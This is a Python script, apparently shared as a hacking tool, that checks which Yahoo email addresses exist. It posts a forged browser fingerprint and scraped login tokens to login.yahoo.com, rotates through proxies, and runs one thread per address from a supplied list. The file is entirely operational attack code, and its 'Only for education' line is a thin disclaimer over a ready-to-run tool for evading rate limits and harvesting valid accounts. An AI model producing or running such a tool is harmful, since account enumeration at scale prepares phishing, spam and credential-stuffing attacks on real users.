#### HHHHHHHHHHHH DON'T STOLE THE SOURCE CODE YOU SON OF BITCH
# Only for education ...
import requests
import random
import json
import string
import urllib3
import threading
from bs4 import BeautifulSoup
from urllib.parse import unquote
urllib3.disable_warnings()
def yahoo(email):
 while True:
  try:
   s=requests.Session()
   tt='http://%s' % (random.sample(listaprx,1)[0])
   s.proxies ={'https':tt}
   head={
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 
    'Pragma':'no-cache',
    'Accept':'*/*'
    }
   response1=s.get('https://login.yahoo.com/',headers=head).text
   soup = BeautifulSoup(response1, 'html.parser')
   crumb=soup.find("input", {"name":"crumb"})['value']
   acrumb=soup.find("input", {"name":"acrumb"})['value']
   sessionIndex=soup.find("input", {"name":"sessionIndex"})['value']
   head2={
     'content-type':'application/x-www-form-urlencoded',
     'Host':'login.yahoo.com', 
     'Connection':'keep-alive', 
     'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36', 
     'X-Requested-With':'XMLHttpRequest', 
     'Origin':'https://login.yahoo.com', 
     'Sec-Fetch-Site':'same-origin', 
     'Sec-Fetch-Mode':'cors', 
     'Sec-Fetch-Dest':'empty', 
     'Referer':'https://login.yahoo.com/', 
     'Accept-Encoding':'gzip, deflate, br', 
     'Accept-Language':'en-US,en;q=0.9'
     }
   data2=str('browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-120%2C%22timezone%22%3A%22Africa%2FCairo%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A3%2C%22hash%22%3A%22e43a8bc708fc490225cde0663b28278c%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.~ANGLE%20(NVIDIA%20GeForce%20GT%20710%20Direct3D11%20vs_5_0%20ps_5_0)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221280%22%2C%22h%22%3A%221024%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22984%22%2C%22h%22%3A%221280%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1611840196072%2C%22render%22%3A1611840197054%7D%7D&crumb='+str(crumb)+'&acrumb='+str(acrumb)+'&sessionIndex='+str(sessionIndex)+'&displayName=&deviceCapability=%7B%22pa%22%3A%7B%22status%22%3Afalse%7D%7D&username='+str(email)+'&passwd=&signin=Next&persistent=y')
   response2=s.post('https://login.yahoo.com/',headers=head2,data=data2,allow_redirects=True).json()
   try:
    if '/account/challenge/password' in str(response2['location']):
     print(str(email)+'==> valid')
   except:
    try:
     if 'messages.INVALID_USERNAME' in str(response2['error']):
       print(str(email)+'==> invalid')
    except:
     try:
       if 'messages.ERROR_NOTFOUND' in str(response2['error']):
        print(str(email)+'==> invalid')
     except:
      try:
       if 'messages.INVALID_IDENTIFIER' in str(response2):
        print(str(email)+'==> invalid')
      except:
       if "Sorry, we don't recognize this account" in str(response2):
        print(str(email)+'==> invalid')
       else:
        print(str(email)+'==> ERROR')
  except Exception as exx:
   continue
  break
txt = input('[X] emails List : ')
filep = input('[X] Proxies List (http) : ')
Threads=input('[X] Threads Number :')
with open(filep) as fileprx:
 listaprx = fileprx.read().split('\n')
 random.shuffle(listaprx)
with open(txt) as file:
 lista = file.read().split('\n')
threadnum = int(Threads)
threads = []
for i in lista:
 thread = threading.Thread(target=yahoo,args=(i.strip(),))
 threads.append(thread)
 thread.start()